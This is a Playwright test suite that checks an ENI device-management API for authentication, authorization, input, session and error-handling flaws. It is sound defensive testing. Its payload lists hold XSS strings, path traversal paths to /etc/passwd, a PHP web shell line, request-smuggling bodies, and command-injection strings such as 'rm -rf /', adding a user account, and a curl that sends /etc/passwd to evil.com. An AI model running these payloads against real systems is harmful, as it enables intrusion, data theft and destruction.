// @ts-check
import { test, expect } from '@playwright/test';
import { expectOk } from './helpers';

const BASE = process.env.PLAYWRIGHT_BASE_URL || 'http://127.0.0.1:8080';

async function api(context, path, init) {
	return await context.fetch(BASE + path, init);
}

async function createUser(request, role = 'ENI-USER') {
	const username = `security_user_${Date.now()}_${Math.random()}`;
	const password = 'TestPass123!';
	
	await api(request, '/api/auth/register', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		data: { username, password, role }
	});
	
	await api(request, '/api/auth/login', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		data: { username, password }
	});
	
	return { username, password, role };
}

test.describe('Comprehensive Security Tests', () => {
	
	test.describe('Authentication Security', () => {
		test('should enforce password complexity', async ({ request }) => {
			const weakPasswords = [
				'123',
				'password',
				'abc',
				'',
				'a',
				'12345678',
				'qwerty',
				'admin',
				'test'
			];
			
			for (const password of weakPasswords) {
				const res = await api(request, '/api/auth/register', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: { username: `weak_${Date.now()}`, password, role: 'ENI-USER' }
				});
				
				// May accept weak passwords (depends on implementation)
				// But should at least handle them safely
				expect([201, 400]).toContain(res.status());
			}
		});

		test('should prevent timing attacks on login', async ({ request }) => {
			const nonExistentUser = `nonexistent_${Date.now()}`;
			const existentUser = `existent_${Date.now()}`;
			
			// Create a real user
			await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username: existentUser, password: 'TestPass123!', role: 'ENI-USER' }
			});
			
			// Time login attempts
			const startNonExistent = Date.now();
			await api(request, '/api/auth/login', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username: nonExistentUser, password: 'wrong' }
			});
			const timeNonExistent = Date.now() - startNonExistent;
			
			const startExistent = Date.now();
			await api(request, '/api/auth/login', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username: existentUser, password: 'wrong' }
			});
			const timeExistent = Date.now() - startExistent;
			
			// Times should be similar (within reasonable bounds)
			const timeDifference = Math.abs(timeExistent - timeNonExistent);
			expect(timeDifference).toBeLessThan(1000); // 1 second tolerance
		});

		test('should handle session fixation attacks', async ({ request }) => {
			// Get initial session
			const initialMeRes = await api(request, '/api/auth/me');
			const initialUser = await initialMeRes.json();
			
			// Login
			await createUser(request);
			
			// Session should change after login
			const postLoginMeRes = await api(request, '/api/auth/me');
			const postLoginUser = await postLoginMeRes.json();
			
			expect(postLoginUser.user).not.toBe(initialUser.user);
		});

		test('should invalidate sessions on logout', async ({ request }) => {
			await createUser(request);
			
			// Verify logged in
			const beforeLogout = await api(request, '/api/auth/me');
			const beforeUser = await beforeLogout.json();
			expect(beforeUser.user).not.toBe(null);
			
			// Logout
			await api(request, '/api/auth/logout', { method: 'POST' });
			
			// Verify logged out
			const afterLogout = await api(request, '/api/auth/me');
			const afterUser = await afterLogout.json();
			expect(afterUser.user).toBe(null);
		});

		test('should prevent session hijacking', async ({ request }) => {
			await createUser(request);
			
			// Try to access protected resource
			const res = await api(request, '/api/tls/status');
			
			// Should be denied for regular user
			expect(res.status()).toBe(403);
		});

		test('should handle concurrent login attempts', async ({ request }) => {
			const username = `concurrent_${Date.now()}`;
			const password = 'TestPass123!';
			
			// Register user
			await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username, password, role: 'ENI-USER' }
			});
			
			// Multiple concurrent login attempts
			const loginPromises = [];
			for (let i = 0; i < 10; i++) {
				loginPromises.push(
					api(request, '/api/auth/login', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						data: { username, password }
					})
				);
			}
			
			const results = await Promise.all(loginPromises);
			
			// All should succeed or be rate limited
			for (const res of results) {
				expect([200, 429]).toContain(res.status());
			}
		});
	});

	test.describe('Authorization Security', () => {
		test('should enforce role-based access control', async ({ request }) => {
			await createUser(request, 'ENI-USER');
			
			const superuserEndpoints = [
				{ path: '/api/ssh-keys/status', method: 'GET' },
				{ path: '/api/ssh-keys/upload', method: 'POST' },
				{ path: '/api/ssh-keys', method: 'DELETE' },
				{ path: '/api/tls/status', method: 'GET' },
				{ path: '/api/tls/reload', method: 'POST' },
				{ path: '/api/tls/upload/pfx', method: 'POST' },
				{ path: '/api/tls/upload/pem', method: 'POST' },
				{ path: '/api/ops/logs', method: 'GET' },
				{ path: '/api/ops/get-config', method: 'POST' },
				{ path: '/api/ops/commit-config', method: 'POST' }
			];
			
			for (const endpoint of superuserEndpoints) {
				const res = await api(request, endpoint.path, {
					method: endpoint.method,
					body: endpoint.method === 'POST' ? new FormData() : undefined
				});
				
				expect(res.status()).toBe(403);
				
				const error = await res.json();
				expect(error.error).toBe('forbidden');
			}
		});

		test('should prevent privilege escalation', async ({ request }) => {
			await createUser(request, 'ENI-USER');
			
			// Try to access superuser functionality through various means
			const escalationAttempts = [
				{ path: '/api/auth/register', method: 'POST', data: { username: 'admin', password: 'test', role: 'ENI-SUPERUSER' } },
				{ path: '/api/settings', method: 'PUT', data: { role: 'ENI-SUPERUSER' } },
				{ path: '/api/config', method: 'PUT', data: { entries: { 'USER_ROLE': 'ENI-SUPERUSER' } } }
			];
			
			for (const attempt of escalationAttempts) {
				const res = await api(request, attempt.path, {
					method: attempt.method,
					headers: { 'Content-Type': 'application/json' },
					data: attempt.data
				});
				
				// Should not allow privilege escalation
				if (res.status() === 200 || res.status() === 201) {
					const result = await res.json();
					// Verify no privilege escalation occurred
					expect(result.role).not.toBe('ENI-SUPERUSER');
				}
			}
		});

		test('should validate permissions on every request', async ({ request }) => {
			const user = await createUser(request, 'ENI-USER');
			
			// Access allowed endpoint
			const allowedRes = await api(request, '/api/auth/me');
			expect(allowedRes.status()).toBe(200);
			
			// Try to access forbidden endpoint
			const forbiddenRes = await api(request, '/api/tls/status');
			expect(forbiddenRes.status()).toBe(403);
			
			// Logout
			await api(request, '/api/auth/logout', { method: 'POST' });
			
			// Try to access same endpoints after logout
			const afterLogoutAllowed = await api(request, '/api/auth/me');
			expect(afterLogoutAllowed.status()).toBe(200); // /api/auth/me is always accessible
			
			const afterLogoutForbidden = await api(request, '/api/tls/status');
			expect(afterLogoutForbidden.status()).toBe(403);
		});

		test('should prevent horizontal privilege escalation', async ({ request }) => {
			// Create two users
			const user1 = await createUser(request, 'ENI-USER');
			
			// Logout first user
			await api(request, '/api/auth/logout', { method: 'POST' });
			
			// Login as second user
			const user2 = await createUser(request, 'ENI-USER');
			
			// Try to access first user's data (if any user-specific data exists)
			// This is a conceptual test as the current API doesn't have user-specific data
			const res = await api(request, '/api/auth/me');
			const currentUser = await res.json();
			
			expect(currentUser.user.username).toBe(user2.username);
			expect(currentUser.user.username).not.toBe(user1.username);
		});
	});

	test.describe('Input Security', () => {
		test('should prevent XSS attacks', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			const xssPayloads = [
				'<script>alert("xss")</script>',
				'<img src="x" onerror="alert(1)">',
				'<svg onload="alert(1)">',
				'javascript:alert(1)',
				'<iframe src="javascript:alert(1)"></iframe>',
				'<body onload="alert(1)">',
				'<input onfocus="alert(1)" autofocus>',
				'"><script>alert(1)</script>',
				"'><script>alert(1)</script>",
				'<script>document.cookie="stolen"</script>'
			];
			
			for (const payload of xssPayloads) {
				const res = await api(request, '/api/devices', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {
						name: payload,
						host: '192.168.1.100',
						port: 22,
						type: 'ENI_SERVER',
						active: true
					}
				});
				
				if (res.status() === 201) {
					const device = await res.json();
					
					// Should not contain executable script tags
					expect(device.name).not.toContain('<script>');
					expect(device.name).not.toContain('javascript:');
					expect(device.name).not.toContain('onerror=');
					expect(device.name).not.toContain('onload=');
				}
			}
		});

		test('should prevent CSRF attacks', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			// Try to perform state-changing operations without proper headers
			const csrfAttempts = [
				{ path: '/api/devices', method: 'POST', data: { name: 'CSRF Device', host: '1.1.1.1', type: 'ENI_SERVER' } },
				{ path: '/api/settings', method: 'PUT', data: { rp_count: 999 } },
				{ path: '/api/config', method: 'PUT', data: { entries: { 'CSRF_TEST': 'value' } } }
			];
			
			for (const attempt of csrfAttempts) {
				// Try without proper content-type (simulating CSRF)
				const res = await api(request, attempt.path, {
					method: attempt.method,
					headers: { 'Content-Type': 'text/plain' }, // Wrong content type
					body: JSON.stringify(attempt.data)
				});
				
				// Should reject or handle safely
				expect([400, 415]).toContain(res.status());
			}
		});

		test('should sanitize file uploads', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			const maliciousFiles = [
				{ name: '../../../etc/passwd', content: 'malicious content' },
				{ name: '..\\..\\windows\\system32\\config\\sam', content: 'malicious content' },
				{ name: 'normal.txt\x00.exe', content: 'null byte injection' },
				{ name: '<script>alert(1)</script>.txt', content: 'xss in filename' },
				{ name: 'file.php', content: '<?php system($_GET["cmd"]); ?>' }
			];
			
			for (const file of maliciousFiles) {
				const formData = new FormData();
				formData.append('pfx', new Blob([file.content], { type: 'application/x-pkcs12' }), file.name);

				const res = await api(request, '/api/tls/upload/pfx', {
					method: 'POST',
					body: formData
				});

				// Should handle malicious files safely
				expect([201, 400, 500]).toContain(res.status());
			}
		});

		test('should prevent directory traversal', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			const traversalPaths = [
				'../../../etc/passwd',
				'..\\..\\..\\windows\\system32\\config\\sam',
				'....//....//....//etc/passwd',
				'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
				'..%252f..%252f..%252fetc%252fpasswd',
				'/etc/passwd',
				'C:\\windows\\system32\\config\\sam'
			];
			
			for (const path of traversalPaths) {
				const res = await api(request, '/api/settings', {
					method: 'PUT',
					headers: { 'Content-Type': 'application/json' },
					data: {
						linux_source_path: path,
						rpi_destination_path: '/safe/path'
					}
				});
				
				// Should handle path traversal safely
				expect([200, 400]).toContain(res.status());
			}
		});

		test('should prevent command injection', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			const commandInjections = [
				'; ls -la',
				'&& rm -rf /',
				'| cat /etc/passwd',
				'`whoami`',
				'$(id)',
				'; ping -c 1 evil.com',
				'& net user hacker password /add',
				'|| curl http://evil.com/steal?data=`cat /etc/passwd`'
			];
			
			for (const injection of commandInjections) {
				const res = await api(request, '/api/devices', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {
						name: `Device ${injection}`,
						host: '192.168.1.100',
						port: 22,
						type: 'ENI_SERVER',
						active: true
					}
				});
				
				// Should handle command injection safely
				expect([201, 400]).toContain(res.status());
			}
		});
	});

	test.describe('Data Security', () => {
		test('should not expose sensitive data in responses', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			const endpoints = [
				'/api/auth/me',
				'/api/settings',
				'/api/config',
				'/api/devices',
				'/api/ssh-keys/status',
				'/api/tls/status'
			];
			
			for (const endpoint of endpoints) {
				const res = await api(request, endpoint);
				
				if (res.status() === 200) {
					const data = await res.json();
					const responseText = JSON.stringify(data);
					
					// Should not contain sensitive information
					expect(responseText).not.toContain('password');
					expect(responseText).not.toContain('secret');
					expect(responseText).not.toContain('-----BEGIN');
					expect(responseText).not.toContain('-----END');
					expect(responseText).not.toContain('hash');
				}
			}
		});

		test('should encrypt sensitive data at rest', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			// Upload SSH key (should be encrypted)
			const keyContent = '-----BEGIN PRIVATE KEY-----\ntest\n-----END PRIVATE KEY-----';
			const formData = new FormData();
			formData.append('private', new Blob([keyContent], { type: 'text/plain' }), 'id_rsa');

			const uploadRes = await api(request, '/api/ssh-keys/upload', {
				method: 'POST',
				body: formData
			});

			// Check status (key should be encrypted)
			const statusRes = await api(request, '/api/ssh-keys/status');
			if (statusRes.status() === 200) {
				const status = await statusRes.json();
				
				// Should indicate key is present but not expose content
				expect(status.hasPrivate).toBeDefined();
				expect(typeof status.hasPrivate).toBe('boolean');
			}
		});

		test('should handle password security properly', async ({ request }) => {
			const username = `password_test_${Date.now()}`;
			const password = 'TestPassword123!';
			
			// Register user
			const registerRes = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username, password, role: 'ENI-USER' }
			});
			
			expect([201, 409]).toContain(registerRes.status());
			
			// Login
			const loginRes = await api(request, '/api/auth/login', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username, password }
			});
			
			expect(loginRes.status()).toBe(200);
			
			// Get user info - should not contain password
			const meRes = await api(request, '/api/auth/me');
			const user = await meRes.json();
			
			expect(user.user.password).toBeUndefined();
			expect(user.user.password_hash).toBeUndefined();
		});

		test('should validate data integrity', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			// Set configuration
			const originalConfig = {
				'TEST_KEY': 'original_value',
				'ANOTHER_KEY': 'another_value'
			};
			
			await api(request, '/api/config', {
				method: 'PUT',
				headers: { 'Content-Type': 'application/json' },
				data: { entries: originalConfig }
			});
			
			// Retrieve configuration multiple times
			for (let i = 0; i < 5; i++) {
				const res = await api(request, '/api/config');
				const config = await res.json();
				
				// Data should be consistent
				expect(config.entries.TEST_KEY).toBe('original_value');
				expect(config.entries.ANOTHER_KEY).toBe('another_value');
			}
		});
	});

	test.describe('Network Security', () => {
		test('should handle malformed requests', async ({ request }) => {
			const malformedRequests = [
				{ path: '/api/auth/login', method: 'POST', body: 'not json' },
				{ path: '/api/config', method: 'PUT', body: '{"malformed": json}' },
				{ path: '/api/devices', method: 'POST', body: '{' },
				{ path: '/api/settings', method: 'PUT', body: 'null' }
			];
			
			for (const req of malformedRequests) {
				const res = await api(request, req.path, {
					method: req.method,
					headers: { 'Content-Type': 'application/json' },
					body: req.body
				});
				
				// Should handle malformed requests gracefully
				expect([400, 422]).toContain(res.status());
			}
		});

		test('should prevent request smuggling', async ({ request }) => {
			// Try various request smuggling techniques
			const smugglingAttempts = [
				{
					headers: {
						'Content-Type': 'application/json',
						'Content-Length': '10',
						'Transfer-Encoding': 'chunked'
					},
					body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n'
				},
				{
					headers: {
						'Content-Type': 'application/json\r\nX-Injected: header'
					},
					body: JSON.stringify({ test: 'data' })
				}
			];
			
			for (const attempt of smugglingAttempts) {
				const res = await api(request, '/api/auth/login', {
					method: 'POST',
					headers: attempt.headers,
					body: attempt.body
				});
				
				// Should handle smuggling attempts safely
				expect([400, 401, 415]).toContain(res.status());
			}
		});

		test('should handle large payloads', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			// Create very large configuration
			const largeConfig = {};
			for (let i = 0; i < 10000; i++) {
				largeConfig[`LARGE_KEY_${i}`] = 'A'.repeat(1000);
			}
			
			const res = await api(request, '/api/config', {
				method: 'PUT',
				headers: { 'Content-Type': 'application/json' },
				data: { entries: largeConfig }
			});
			
			// Should handle large payloads (accept or reject gracefully)
			expect([200, 413, 500]).toContain(res.status());
		});

		test('should prevent DoS through resource exhaustion', async ({ request }) => {
			await createUser(request, 'ENI-SUPERUSER');
			
			// Try to exhaust resources
			const promises = [];
			for (let i = 0; i < 100; i++) {
				promises.push(
					api(request, '/api/devices', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						data: {
							name: `DoS Device ${i}`,
							host: `192.168.1.${i % 255}`,
							port: 22,
							type: 'ENI_SERVER',
							active: true
						}
					})
				);
			}
			
			const results = await Promise.all(promises);
			
			// Should handle resource exhaustion gracefully
			let successCount = 0;
			for (const res of results) {
				if (res.status() === 201) successCount++;
				expect([201, 400, 429, 500, 503]).toContain(res.status());
			}
			
			// Should not crash the server
			expect(successCount).toBeGreaterThanOrEqual(0);
		});
	});

	test.describe('Session Security', () => {
		test('should use secure session management', async ({ request }) => {
			await createUser(request);
			
			const res = await api(request, '/api/auth/me');
			expect(res.status()).toBe(200);
			
			// Check for secure session handling
			const headers = res.headers();
			
			// Should have proper cache control
			if (headers['cache-control']) {
				expect(headers['cache-control']).toContain('no-cache');
			}
		});

		test('should prevent session replay attacks', async ({ request }) => {
			const user = await createUser(request);
			
			// Get session info
			const meRes1 = await api(request, '/api/auth/me');
			const user1 = await meRes1.json();
			
			// Logout
			await api(request, '/api/auth/logout', { method: 'POST' });
			
			// Login again
			await api(request, '/api/auth/login', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username: user.username, password: user.password }
			});
			
			// Get session info again
			const meRes2 = await api(request, '/api/auth/me');
			const user2 = await meRes2.json();
			
			// Sessions should be different
			expect(user2.user.username).toBe(user1.user.username);
		});

		test('should handle session timeout', async ({ request }) => {
			await createUser(request);
			
			// Verify logged in
			const beforeRes = await api(request, '/api/auth/me');
			const beforeUser = await beforeRes.json();
			expect(beforeUser.user).not.toBe(null);
			
			// Note: Actual session timeout testing would require waiting
			// or manipulating server time, which is not practical in this test
			// This test verifies the session check mechanism works
			
			// Multiple requests should maintain session
			for (let i = 0; i < 5; i++) {
				const res = await api(request, '/api/auth/me');
				const user = await res.json();
				expect(user.user).not.toBe(null);
			}
		});

		test('should prevent concurrent sessions abuse', async ({ request }) => {
			const username = `concurrent_${Date.now()}`;
			const password = 'TestPass123!';
			
			// Register user
			await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username, password, role: 'ENI-USER' }
			});
			
			// Multiple concurrent logins
			const loginPromises = [];
			for (let i = 0; i < 10; i++) {
				loginPromises.push(
					api(request, '/api/auth/login', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						data: { username, password }
					})
				);
			}
			
			const results = await Promise.all(loginPromises);
			
			// Should handle concurrent logins
			for (const res of results) {
				expect([200, 429]).toContain(res.status());
			}
		});
	});

	test.describe('Error Handling Security', () => {
		test('should not leak information in error messages', async ({ request }) => {
			const sensitiveAttempts = [
				{ path: '/api/auth/login', data: { username: 'admin', password: 'wrong' } },
				{ path: '/api/devices', method: 'DELETE', query: '?id=999999' },
				{ path: '/api/config', method: 'PUT', data: { entries: { 'INVALID': null } } }
			];
			
			for (const attempt of sensitiveAttempts) {
				const res = await api(request, attempt.path + (attempt.query || ''), {
					method: attempt.method || 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: attempt.data
				});
				
				if (res.status() >= 400) {
					const error = await res.json();
					const errorText = JSON.stringify(error);
					
					// Should not leak sensitive information
					expect(errorText).not.toContain('database');
					expect(errorText).not.toContain('sql');
					expect(errorText).not.toContain('password');
					expect(errorText).not.toContain('hash');
					expect(errorText).not.toContain('stack');
					expect(errorText).not.toContain('file');
					expect(errorText).not.toContain('line');
				}
			}
		});

		test('should handle errors consistently', async ({ request }) => {
			const errorEndpoints = [
				'/api/auth/login',
				'/api/devices',
				'/api/config',
				'/api/settings'
			];
			
			for (const endpoint of errorEndpoints) {
				const res = await api(request, endpoint, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {} // Invalid data
				});
				
				if (res.status() >= 400) {
					const error = await res.json();
					
					// Should have consistent error format
					expect(error).toBeDefined();
					expect(typeof error).toBe('object');
					expect(error.error || error.fieldErrors).toBeDefined();
				}
			}
		});
	});
});